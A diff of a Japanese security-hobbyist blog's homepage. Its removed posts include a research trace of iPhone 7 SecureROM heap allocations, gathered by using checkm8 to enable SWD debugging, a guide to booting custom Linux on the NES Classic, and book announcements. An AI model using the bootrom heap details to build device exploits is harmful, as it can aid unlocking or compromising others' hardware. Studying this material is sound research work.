-                        <a href="//blog.urandom.team/post/tracing-securerom-malloc-free/" class="post-title">SecureROMのmalloc/free追跡</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">op</strong>
-                            
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <h1 id="概要">概要</h1>
-<p>axi0mX氏のcheckm8公開により、広く一般にSecureROM(iPhone/iPadのブートローダー)の動的解析が可能になった。SecureROMのヒープレイアウトへの理解を深める為にヒープ関連処理を解析し、その一環としてSecureROM開始時からDFUモード起動完了までの間に発生するmalloc/freeの呼び出しをデバッガーで追跡したので、研究用として記事に残す。</p>
-<p>C97でもこの記事のコピ本を頒布予定(火曜日 南地区 リ-04b)で、間に合えば細かい話を加筆する。</p>
-<h1 id="関連記事">関連記事</h1>
-<p>checkm8の解説ではa1exdandy氏による次の記事が非常によくまとまっている。</p>
-<p><a href="https://habr.com/en/company/dsec/blog/472762/">Technical analysis of the checkm8 exploit</a></p>
-<p>上の記事でもヒープの確保シーケンスについて静的解析に基づいた解説があるが、この記事の動的解析でも上の記事と近い結果が得られた。</p>
-<h1 id="検証環境">検証環境</h1>
-<ul>
-<li>iPhone 7 (A1779)</li>
-<li>Bonobo JTAG/SWD Debug Cable</li>
-<li>ipwndfu
-<ul>
-<li>Matthew Pierson氏によるfork版</li>
-<li>commit bb3c1d618f96ce96956089823f396b777b4c46acに一部変更を加えたもの</li>
-</ul>
-</li>
-</ul>
-<h1 id="調査手順">調査手順</h1>
-<p>checkm8(ipwndfu)を使用してiPhone 7(ターゲット)からSecureROMを読み出しGhidraで解析した。解析によりいわゆるmalloc, free, memalignと思われる3関数のアドレスを特定した。</p>
-<p>ipwndfuを使用してターゲットのSWDを有効化(demote)し、Bonobo JTAG/SWD Debug Cableを使用してgdbでターゲットにアタッチした。</p>
-<p>SecureROM開始直後から実行を追跡するにはターゲットをリセットする必要があるが、通常の手順でターゲットをリセットすると、リセットによりdemotionの状態が初期化されてSWDが無効になり追跡できなくなる。このため、今回はdemote後にターゲットをreset vectorへジャンプさせてもう一度最初から起動処理を行わせて追跡した。Reset vectorへのジャンプ前に予めmalloc, free, memalignへハードウェアブレークポイントを張っておいて、それぞれへの呼び出しを監視・記録した。</p>
-<h1 id="追跡結果">追跡結果</h1>
-<h2 id="備考">備考</h2>
-<p>この章では、iPhone 7の実機から読みだした情報を引用する。この章で引用するメモリダンプのベースはDFUモード起動完了直後のもので、ベースは0x180000000である。</p>
-<h2 id="一覧">一覧</h2>
-<p>次の書式でalloc, free, memalignの呼び出しの遷移を記す。</p>
-<p>呼び出し元アドレス : 関数名(引数) =&gt; 返り値</p>
-<pre><code>000000010000f858 : free(0x00000001801b4080)
-000000010000edd0 : alloc(48)                    =&gt; 0x00000001801b4080
-000000010000ede0 : alloc(256)                   =&gt; 0x00000001801b4100
-0000000100011548 : alloc(4000)                  =&gt; 0x00000001801b4240
-00000001000115d0 : free(0x00000001801b4240)
-000000010000f124 : alloc(512)                   =&gt; 0x00000001801b4240
-000000010000d10c : alloc(234)                   =&gt; 0x00000001801b4480
-000000010000d10c : alloc(22)                    =&gt; 0x00000001801b45c0
-000000010000d10c : alloc(62)                    =&gt; 0x00000001801b4640
-000000010000d10c : alloc(198)                   =&gt; 0x00000001801b46c0
-000000010000d10c : alloc(62)                    =&gt; 0x00000001801b4800
-000000010000a9e0 : alloc(960)                   =&gt; 0x00000001801b4880
-000000010000a9f0 : alloc(16384)                 =&gt; 0x00000001801b4c80
-000000010000df08 : memalign(2048, 0x00000040)   =&gt; 0x00000001801b8d00
-000000010000d2a4 : alloc(25)                    =&gt; 0x00000001801b9540
-000000010000d2b4 : alloc(25)                    =&gt; 0x00000001801b95c0
-</code></pre><h2 id="メモ">メモ</h2>
-<h3 id="000000010000f858--free0x00000001801b4080">000000010000f858 : free(0x00000001801b4080)</h3>
-<p>このfreeは不要領域の解放のためではなく、ヒープの初期化時に使用可能な領域をリストに登録するためのもの。</p>
-<p>ヒープのベースは0x1801b4000で、空ブロック1つ(長さ0x40)と、追加しようとしているブロック自身のメタデータ(長さ0x40)が先行して配置されるため、ベース + 0x80が追加する領域の（データ部分の）オフセットになる。空ブロックは後方にも配置される。</p>
-<h3 id="000000010000edd0--alloc48---------------------0x00000001801b4080">000000010000edd0 : alloc(48)                    =&gt; 0x00000001801b4080</h3>
-<p>役割不明のバッファー。</p>
-<h3 id="000000010000ede0--alloc256--------------------0x00000001801b4100">000000010000ede0 : alloc(256)                   =&gt; 0x00000001801b4100</h3>
-<p>役割不明のバッファー。</p>
-<h3 id="0000000100011548--alloc4000-------------------0x00000001801b4240">0000000100011548 : alloc(4000)                  =&gt; 0x00000001801b4240</h3>
-<p>役割不明のバッファー。</p>
-<h3 id="00000001000115d0--free0x00000001801b4240">00000001000115d0 : free(0x00000001801b4240)</h3>
-<p>直前で確保した長さ4000のバッファーを解放。</p>
-<h3 id="000000010000f124--alloc512--------------------0x00000001801b4240">000000010000f124 : alloc(512)                   =&gt; 0x00000001801b4240</h3>
-<p>役割不明のバッファー。</p>
-<p>メモリの内容を確認すると、先頭に”host bridge”とのASCII文字列が書き込まれている。</p>
-<pre><code>001b4240  68 6f 73 74 20 62 72 69  64 67 65 00 00 00 00 00  |host bridge.....|
-001b4250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
-*
-001b4310  0c 16 00 00 01 00 00 00  6c 16 00 00 01 00 00 00  |........l.......|
-001b4320  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 c0  |................|
-001b4330  00 00 00 02 00 00 00 00  00 00 00 00 00 00 00 00  |................|
-001b4340  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
-*
-001b4440
-</code></pre><h3 id="000000010000d10c--alloc234--------------------0x00000001801b4480">000000010000d10c : alloc(234)                   =&gt; 0x00000001801b4480</h3>
-<p>USBのString Descriptor (Descriptor Index = 1)</p>
-<p>ApNonceとSEPNonceをHostに通知するためのもの。ASCII文字による16進表記かつ1文字あたり2バイトで表現するのでApNonceとSEPNonceの情報量に比してサイズが大きい。</p>
-<p>これ以降の追跡結果はa1exdandy氏の記事の解析結果と概ね一致する。</p>
-<h3 id="000000010000d10c--alloc22---------------------0x00000001801b45c0">000000010000d10c : alloc(22)                    =&gt; 0x00000001801b45c0</h3>
-<p>USBのString Descriptor (Manufacturer)</p>
-<h3 id="000000010000d10c--alloc62---------------------0x00000001801b4640">000000010000d10c : alloc(62)                    =&gt; 0x00000001801b4640</h3>
-<p>USBのString Descriptor (Product)</p>
-<h3 id="000000010000d10c--alloc198--------------------0x00000001801b46c0">000000010000d10c : alloc(198)                   =&gt; 0x00000001801b46c0</h3>
-<p>USBのString Descriptor (Serial Number)</p>
-<p>DFUモードではここにハードウェアとソフトウェアのバージョンや設定情報を詰め込むので長い。</p>
-<h3 id="000000010000d10c--alloc62---------------------0x00000001801b4800">000000010000d10c : alloc(62)                    =&gt; 0x00000001801b4800</h3>
-<p>USBのString Descriptor (Configuration)</p>
-<h3 id="000000010000a9e0--alloc960--------------------0x00000001801b4880">000000010000a9e0 : alloc(960)                   =&gt; 0x00000001801b4880</h3>
-<p>USBコントローラーを制御するタスクのタスク構造体。</p>
-<h3 id="000000010000a9f0--alloc16384------------------0x00000001801b4c80">000000010000a9f0 : alloc(16384)                 =&gt; 0x00000001801b4c80</h3>
-<p>USBコントローラーを制御するタスクのタスクスタック。</p>
-<p>ここの確保サイズはa1exdandy氏の記事と異なる。a1exdandy氏の記事では確保サイズが0x1000となっているのに対して、今回実機で確認できた確保サイズは0x4000(16384)だった。呼び出し箇所の周辺を調べるとmax(0x1000, 0x4000)の比較結果を確保サイズとしていた。</p>
-<h3 id="000000010000df08--memalign2048-0x00000040----0x00000001801b8d00">000000010000df08 : memalign(2048, 0x00000040)   =&gt; 0x00000001801b8d00</h3>
-<p>USBの入出力用バッファー。</p>
-<h3 id="000000010000d2a4--alloc25---------------------0x00000001801b9540">000000010000d2a4 : alloc(25)                    =&gt; 0x00000001801b9540</h3>
-<p>USBのConfiguration Descriptor</p>
-<p>a1exdandy氏の記事によればこちらがHigh-Speed用のdescriptorとのこと。書き込まれるデータは後述のFull-Speed用descriptorと同一。</p>
-<p>ipwndfu/src/checkm8_arm64.S内のgUSBDescriptorsは、ここで確保されたバッファーへのポインターを指す。</p>
-<pre><code>00088a30  40 95 1b 80 01 00 00 00  c0 95 1b 80 01 00 00 00  |@...............|
-</code></pre><h3 id="000000010000d2b4--alloc25---------------------0x00000001801b95c0">000000010000d2b4 : alloc(25)                    =&gt; 0x00000001801b95c0</h3>
-<p>USBのConfiguration Descriptor</p>
-<p>a1exdandy氏の記事によればこちらがFull-Speed用のdescriptorとのこと。</p>
-<h1 id="備考-1">備考</h1>
-<p>今回はreset vectorにジャンプすることでwarm reset(的な操作)を施してSecureROMを開始直後から追跡したが、warm reset時の状態は通常起動時と異なるため、通常起動時と挙動が一致するかどうかは不明。ただし、warm reset後でもcheckm8が成功することは確認できた。</p>
-<h1 id="編集履歴">編集履歴</h1>
-<h2 id="20191231">2019/12/31</h2>
-<p>USB関連の記述に誤りがあったため訂正した。</p>
-
-                    </div>
-                </section>
-                
-                <h1 class="content-subhead">25 Dec 2018, 18:03</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/c95-announce/" class="post-title">C95参加と新刊のお知らせ</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">yyu</strong>
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <p>C95（2018年冬コミ）に当選してました。
-スペースは <strong>2日目 東6 ト44b</strong> です。
-新刊“urandom vol.7”を出します。</p>
-<p>次の画像をクリックすると本文サンプルが見えます。</p>
-<p><a href="/pdfs/c95_sample.pdf"><img src="/images/c95_cover_thumb.jpg" alt="c95 sample"></a></p>
-<p>urandom vol.7は次の内容になります。</p>
-<ul>
-<li>SECCON2018 国際大会決勝参戦記 (by urandom)</li>
-<li>展開署名: Folding Signatureの進捗 (by yyu)</li>
-</ul>
-<p>ページ数は本文30pとなっております。頒布価格は300円の予定です。</p>
-<p>それでは会場でお会いしましょう。</p>
-
-                    </div>
-                </section>
-                
-                <h1 class="content-subhead">05 Aug 2018, 22:13</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/c94-announce/" class="post-title">C94参加と新刊のお知らせ</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">yyu</strong>
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <p>C94（2018年夏コミ）に当選してました。
-スペースは <strong>1日目 西1 む39b</strong> です。
-新刊“urandom vol.6”を出します。</p>
-<p>次の画像をクリックすると本文サンプルが見えます。</p>
-<p><a href="/pdfs/c94_sample.pdf"><img src="/images/c94_cover_thumb.png" alt="c94 sample"></a></p>
-<p>urandom vol.6は次の内容になります。</p>
-<ul>
-<li>IoT機器のFW解析 -CBCTF2018予選問題 Odin解説- (by op)</li>
-<li>素因数分解ゲーム (by yyu)</li>
-</ul>
-<p>ページ数は本文34pとなっております。頒布価格は300円の予定です。</p>
-<p>それでは会場でお会いしましょう。</p>
-
-                    </div>
-                </section>
-                
-                <h1 class="content-subhead">25 Dec 2017, 18:40</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/c93-announce/" class="post-title">C93参加と新刊のお知らせ</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">yyu</strong>
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <p>C93（2017年冬コミ）に当選してました。
-スペースは <strong>1日目 東キ47a</strong> です<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>。
-新刊“urandom vol.5”を出します。</p>
-<p>次の画像をクリックすると本文サンプルが見えます。</p>
-<p><a href="/pdfs/c93_sample.pdf"><img src="/images/c93_cover_thumb.png" alt="c94 sample"></a></p>
-<p>urandom vol.5は次のような内容になります。</p>
-<ul>
-<li>CBCTF2017問題解説 - One of Three Billion (by op)</li>
-<li>Bitcoinによる公平なCTF (by yyu)</li>
-</ul>
-<p>ページ数は本文34pとなっております。頒布価格は300円の予定です。</p>
-<p>それでは会場でお会いしましょう。</p>
-<section class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1" role="doc-endnote">
-<p>これまでは3日目でしたが、今回から1日目となりましたのでご注意ください。 <a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
-
-                    </div>
-                </section>
-                
-                <h1 class="content-subhead">08 Aug 2017, 02:03</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/c92-announce/" class="post-title">C92参加と新刊のお知らせ</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">yyu</strong>
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <p>C92（2017年夏コミ）に当選してました。
-スペースは <strong>3日目 東イ-60b</strong> です。
-新刊“urandom vol.4”と既刊“urandom vol.3”を出します。</p>
-<p><a href="/pdfs/c92_sample.pdf"><img src="/images/c92_cover_thumb.png" alt="c92 sample"></a></p>
-<p>urandom vol.4は次のような内容になります。</p>
-<ul>
-<li>mitmproxy入門 (by op)</li>
-<li>公平なランサムウェアプロトコル (by yyu)</li>
-</ul>
-<p>ページ数は本文34pとなっております。頒布価格は300円の予定です。</p>
-<p>それでは会場でお会いしましょう。</p>
-
-                    </div>
-                </section>
-                
-                <h1 class="content-subhead">28 Apr 2017, 21:15</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/cho-tech/" class="post-title">超技術書典参加のお知らせ</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">yyu</strong>
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <p>ニコニコ超会議2017に併催の<a href="https://techbookfest.org/event/cho01">超技術書典</a>に当選しました。スペースは <strong>1日目 B-17</strong> です。
-C91に引き続き、“<a href="/post/c91-digital/">urandom vol.3</a>”を頒布します。</p>
-<ul>
-<li><a href="https://techbookfest.org/event/cho01/circle/5671617594130432">https://techbookfest.org/event/cho01/circle/5671617594130432</a></li>
-</ul>
-<p>頒布価格は300円です。それでは会場でお会いしましょう。</p>
-
-                    </div>
-                </section>
-                
-                <h1 class="content-subhead">12 Mar 2017, 17:17</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/c91-digital/" class="post-title">urandom vol.3電子版公開のお知らせ</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">yyu</strong>
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <h1 id="urandom-vol3電子版">urandom vol.3電子版</h1>
-<p><img src="/images/c91_cover.png" alt="C91 Sample"></p>
-<p>C91の1ヶ月後に出すと告知しておいて、結局3月になってしまいましたが、urandom vol.3の電子版を公開しました。</p>
-<p>urandom vol.3電子版は <strong>128円</strong> での販売となります。内容は物理書籍版とほぼ同じです。</p>
-<p>販売ページは<a href="https://gum.co/uqxsS">こちら（Gumroad）</a>です。決済にはクレジットカードかPayPalが使えます。</p>
-<h2 id="物理書籍版購入者の方へ">物理書籍版購入者の方へ</h2>
-<p>購入ページに“Offer code”という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。</p>
-<ul>
-<li>コードを使用する場合、クレジットカード情報は不要です。正しいコードを入力すると入力欄が非表示になります。</li>
-<li>同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。</li>
-</ul>
-
-                    </div>
-                </section>
-                
-                <h1 class="content-subhead">13 Dec 2016, 01:30</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/c91-sample/" class="post-title">C91 新刊のお知らせ</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">mayth</strong>
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <p><a href="/pdfs/c91_sample.pdf"><img src="/images/c91_cover.png" alt="C91 Sample"></a></p>
-<p>表紙だよ！　リンク先はサンプルのPDFだよ！（※サンプルにはカラー写真が含まれていますが、当日頒布する冊子はグレースケールです）</p>
-<p>数多の困難を乗り越え、来るC91で頒布する新刊「urandom vol.3」の入稿が完了しました。</p>
-<p>改めて告知しますと、スペースは <strong>土曜日 東R-12b</strong> です（<a href="https://webcatalog.circle.ms/Circle/13006119">Webカタログ</a>）。3日目だよ、大晦日だよ。</p>
-<p>ページ数は本文64pと読みごたえ抜群の仕様となっております。頒布価格は300円です。</p>
-<p>今回の記事は以下の3本です。</p>
-<ul>
-<li>ファミコンミニとLinux - op</li>
-<li>Secure Grouping Protocol Using Mental Poker - yyu</li>
-<li>urandom出版技術部活動報告 - mayth</li>
-</ul>
-<p>なお、今回<strong>既刊の頒布はありません</strong>。vol.1、vol.2は次の電子書籍をご利用ください。</p>
-<ul>
-<li><a href="https://gumroad.com/l/xgnF">urandom vol.1</a></li>
-<li><a href="https://gumroad.com/l/zjTOY">urandom vol.2</a></li>
-</ul>
-<p>vol.3の電子書籍版はコミックマーケット91の1ヶ月後を目処に配信予定です。</p>
-<p>それでは、大晦日に会場でお会いしましょう。</p>
-
-                    </div>
-                </section>
-                
-                <h1 class="content-subhead">14 Nov 2016, 20:01</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/my-linux-kernel-on-nesclassic/" class="post-title">ファミコンミニで自前のLinuxカーネルを動かす手順</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">op</strong>
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Misc" href='//blog.urandom.team/categories/Misc'>Misc</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <h1 id="はじめに">はじめに</h1>
-<p>ファミコンミニ自体の権利表記画面や<a href="https://www.nintendo.co.jp/support/oss/">任天堂Webサイト</a>で配布されているOSSソースコードからも分かるように、ファミコンミニの中で動いているのはU-bootで起動されたLinuxです。なので、ファミコンミニを適切に初期化した上で、適切にビルドしたLinuxカーネルを流しこめば、ファミコンミニ上で自前のLinuxを動かせます。U-boot(GPLv2)とLinux(GPLv2)のソースコードを読解・ビルドして自前のLinuxを起動したので、手順を書きます。</p>
-<blockquote class="twitter-tweet tw-align-center" data-lang="ja"><p lang="ja" dir="ltr">ファミコンミニで自前ビルドのLinux動いた (My Linux kernel on NES Classic) <a href="https://t.co/00EZZgMx7A">pic.twitter.com/00EZZgMx7A</a></p>&mdash; op (@6f70) <a href="https://twitter.com/6f70/status/797939754528444416">2016年11月13日</a></blockquote>
-<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
-<h1 id="注意">注意</h1>
-<p><strong>この記事の内容を実践すると、製品保証が無効になったり、故障に繋がる可能性があります。内容を理解できる人が自己責任で行って下さい。</strong></p>
-<h1 id="事前準備">事前準備</h1>
-<ul>
-<li>
-<p>sunxi-fel (<a href="http://linux-sunxi.org/Sunxi-tools">sunxi-tools</a>)</p>
-</li>
-<li>
-<p>abootimg</p>
-</li>
-<li>
-<p>ARMのコンパイル環境</p>
-<ul>
-<li>Ubuntu 12.04 + gcc-arm-linux-gnueabi でテストしています。</li>
-</ul>
-</li>
-<li>
-<p>ファミコンミニのシリアルコンソール</p>
-<ul>
-<li>参考: <a href="https://www.ns-koubou.com/blog/2016/11/11/nes_classic/">ニンテンドークラシックミニ ファミリーコンピュータの中身の話 - えぬえす工房</a></li>
-<li>参考: <a href="http://linux-sunxi.org/Nintendo_NES_Classic_Edition">Nintendo NES Classic Edition - linux-sunxi.org</a></li>
-</ul>
-</li>
-<li>
-<p>ファミコンミニとホストPCのUSB接続</p>
-</li>
-</ul>
-<h1 id="手順">手順</h1>
-<ol>
-<li>
-<p>U-boot, 起動イメージの取得</p>
-<ol>
-<li>
-<p>シリアルコンソールで <code>s</code> キーを押しながらファミコンミニを起動して、U-bootのシェルに入ります。</p>
-</li>
-<li>
-<p>シリアルコンソールで以下のコマンドを実行して、内蔵フラッシュの先頭部分を読み出します。</p>
-<pre><code>sunxi_flash phy_read 58000000 0 80
-</code></pre><p>読み出し先アドレス0x58000000とセクタ数0x80は、適当な使ってなさそうな所と長さなので、必然性はありません。</p>
-</li>
-<li>
-<p>シリアルコンソールで <code>fastboot_test</code> コマンドを実行して、FELモードに入ります。</p>
-<p>fastbootと言いつつFELモードに入ります。このFELモードでは最初からDRAMが有効化されています。ただし、シリアルコンソールが壊れるようです。</p>
-</li>
-<li>
-<p>ホストで以下のコマンドを実行して、手順1.2で読みだしたイメージをホストへ転送します。</p>
-<pre><code>sunxi-fel read 0x58000000 0x1000000 0000-0080.bin
-</code></pre></li>
-<li>
-<p>U-bootのマジック <code>uboot</code> でイメージ中を検索するとU-bootが見つかります。オフセット0x14にサイズが格納されているので、それを元に切り出します。切り出したファイルをu-boot.binとします。</p>
-</li>
-<li>
-<p>起動イメージのマジック <code>ANDROID!</code> でイメージ中を検索すると起動イメージが見つかるので、適当に切り出します。切り出したファイルをboot.imgとします。</p>
-</li>
-</ol>
-</li>
-<li>
-<p>Linuxのビルド</p>
-<p>配布されているソースコード中の linux-9ed0e6c8612113834e9af9d16a3e90b573c488ca をビルドします。</p>
-<ol>
-<li>
-<p><code>drivers/video/sunxi/hdmi_ep952/EP952api.h</code> のコメントアウトされている <code>WARN</code> マクロを有効にします。</p>
-</li>
-<li>
-<p>以下のコマンドを実行してconfigします。</p>
-<pre><code>export ARCH=arm
-export CROSS_COMPILE=arm-linux-gnueabi-
-
-make sun8iw5p1smp_defconfig
-</code></pre></li>
-<li>
-<p>.configに以下の変更を加えます。</p>
-<pre><code>CONFIG_INITRAMFS_SOURCE=&quot;&quot;
-CONFIG_CMA=y
-CONFIG_FB_SUNXI=y
-CONFIG_CMDLINE_FORCE=n
-CONFIG_USB_SUPPORT=n
-</code></pre><p>USBを切っているのは単にサイズ削減の為です。</p>
-</li>
-<li>
-<p>以下のコマンドを実行してビルドします。</p>
-<pre><code>make zImage
-</code></pre><p>対話的に聞かれるconfigの確認は全部そのままでもとりあえず動きました。</p>
-</li>
-</ol>
-</li>
-<li>
-<p>U-boot, 起動イメージの作成</p>
-<ol>
-<li>
-<p>u-boot.bin中の <code>bootcmd=sunxi_flash phy_read 43800000 30 20;boota 43800000</code> を <code>bootcmd=boota 43800000</code> に置換します(オフセットがずれないようにNULLパディング)。</p>
-</li>
-<li>
-<p>以下のコマンドで起動イメージを展開します。</p>
-<pre><code>abootimg -x boot.img
-</code></pre></li>
-<li>
-<p>zImageを手順2で作成したものに差し替え、以下のコマンドで起動イメージを再作成します。</p>
-<pre><code>abootimg --create myboot.img -f bootimg.cfg -k zImage -r initrd.img
-</code></pre><p>このままではinitrd.imgを展開できないので、起動しても <code>/init</code> を実行できずにPanicします。
-起動後にシェル等を操作したい場合は、カーネルパラメーターとinitrd.imgを適宜編集したり作りなおして下さい。</p>
-</li>
-</ol>
-</li>
-<li>
-<p>Linuxの起動</p>
-<ol>
-<li>
-<p>手順1.1, 1.3でFELモードに入ります。</p>
-</li>
-<li>
-<p>ホストで以下のコマンドを実行すると、Linuxが起動します。</p>
-<pre><code>sunxi-fel write 0x43800000 myboot.img
-sunxi-fel write 0x47000000 u-boot.bin
-sunxi-fel exe   0x47000000
-</code></pre></li>
-</ol>
-</li>
-</ol>
-<h1 id="おわりに">おわりに</h1>
-<p>ざっと手順を書き出しました。ファミコンミニは拡張性が低いのが難点ですが、計算能力はそれなりにあるので色々な事ができそうです。
-Linuxカーネルはとりあえず動くものをビルドしたので、より適切なビルド方法は他にあるかと思いますし、起動手順ももっと簡素な物がありそうです。</p>
-<p>作業を始めた当初は <code>fastboot_test</code> コマンドでDRAM有効化済みのFELモードに入れる事に気付いておらず、 <code>efex</code> コマンドでDRAM無効なFELモードに入って、頑張って自前でDRAMを有効化して作業していました。
-その辺のU-bootの紆余曲折やソースコードを解説する記事を、C91で頒布する同人誌 <a href="//blog.urandom.team/post/c90-digital-and-c91/">urandom vol.3</a> に書く予定です（落とさなければ）。続報は追ってこのブログに書きます。</p>
-
-                    </div>
-                </section>
-                
-            </div>
-            
-<div class="pagination">
-  <nav role="pagination" class="post-list-pagination">
-      
-    <span class="post-list-pagination-item post-list-pagination-item-current">Page 1 of 3</span>
+<body
+  data-theme="auto"
+  data-theme-auto='true'
+  >
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
     
-      <a href="/page/2/" class="post-list-pagination-item pure-button post-list-pagination-item-next">
-        Older&nbsp;<i class="fa fa-angle-double-right"></i>
-      </a>
-    
-  </nav>
-</div>
-
-
-            <div class="footer">
-    <div class="pure-menu pure-menu-horizontal pure-menu-open">
-        <ul>
-            <li>Powered by <a class="hugo" href="https://gohugo.io/" target="_blank">hugo</a></li>
-        </ul>
-    </div>
-</div>
-<script src='//blog.urandom.team/js/all.min.js'></script>
-
-        </div>
-    </div>
-</div>
-
-
-<script>
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-ga('create', '', 'auto');
-ga('send', 'pageview');
-
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
 </script>
 
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://urandom.team">urandom</a>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+
+
+
+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/seccon-beginners-ctf-2020/">SECCON Beginners CTF 2020 Write-up</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-24</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/ctf">CTF</a>&nbsp;<a href="/tags/write-ups">Write-ups</a>&nbsp;<a href="/tags/seccon">SECCON</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催されたSECCON Beginners CTF 2020のwrite-upです。 なお、今回は以下のメンバー編成で参加しました。 yuscarlet mayth yyu favcastle Pwn Beginner&rsquo;s Stack Let&rsquo;s learn how to abuse stack overflow! 64bit ELFのバイナリが与えられる。これがサーバー
+    </div>
+</div>
+
+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/tracing-securerom-malloc-free/">SecureROMのmalloc/free追跡</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2019-12-29</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/tech">tech</a>&nbsp;<a href="/tags/misc">Misc</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        概要 axi0mX氏のcheckm8公開により、広く一般にSecureROM(iPhone/iPadのブートローダー)の動的解析が可能になった。SecureROMのヒープレイアウトへの理解を深める為にヒ
+    </div>
+</div>
+
+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/c95-announce/">C95参加と新刊のお知らせ</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2018-12-25</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/publication">Publication</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        C95（2018年冬コミ）に当選してました。 スペースは 2日目 東6 ト44b です。 新刊“urandom vol.7”を出します。 次の画像をクリックすると本文サンプルが見えます。 urandom vol.7は次の内容になりま
+    </div>
+</div>
+
+<div class="post">
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/c94-announce/">C94参加と新刊のお知らせ</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2018-08-05</span>
+
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/publication">Publication</a>&nbsp;</span>
+
+    </div>
+    <div class="post-item post-summary markdown-body">
+        C94（2018年夏コミ）に当選してました。 スペースは 1日目 西1 む39b です。 新刊“urandom vol.6”を出します。 次の画像をクリックすると本文サンプルが見えます。 urandom vol.6は次の内容になりま
+    </div>
+</div>
+
